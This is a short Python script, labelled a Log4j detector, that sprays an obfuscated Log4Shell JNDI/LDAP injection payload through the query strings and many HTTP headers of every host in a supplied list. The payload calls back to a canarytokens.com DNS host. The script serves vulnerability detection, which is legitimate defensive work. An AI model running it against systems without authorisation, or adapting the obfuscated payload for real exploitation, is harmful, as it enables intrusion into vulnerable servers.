import requests
import sys
import urllib.parse

print("simple log4j detector")
fil = sys.argv[1]
attackerDNS = '4k85bpl5qqxhsiqg7gm2znbkf.canarytokens.com' # grab your canary here: https://canarytokens.org/
payload = "${${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}d${env:ENV_NAME:-a}p${env:ENV_NAME:-:}//"+attackerDNS+"/a}"


subd =  list(open(fil).read().split())

headers={"Referer":payload,"User-Agent": "Mozzila"+payload,"Origin": payload,"Location": payload,"Report-To": payload,"X-Forwarded-For": payload,"X-Forwarded-Host": payload,"X-Forwarded-Proto": payload}
for i in range(len(subd)):
    URLtoTest="https://"+subd[i]+"/?test="+urllib.parse.quote(payload)
    print(URLtoTest+"\n")
    try:
        requests.get(URLtoTest,headers=headers, timeout=5)
        requests.post(URLtoTest,headers=headers,timeout=5)
    except:
        print("error")
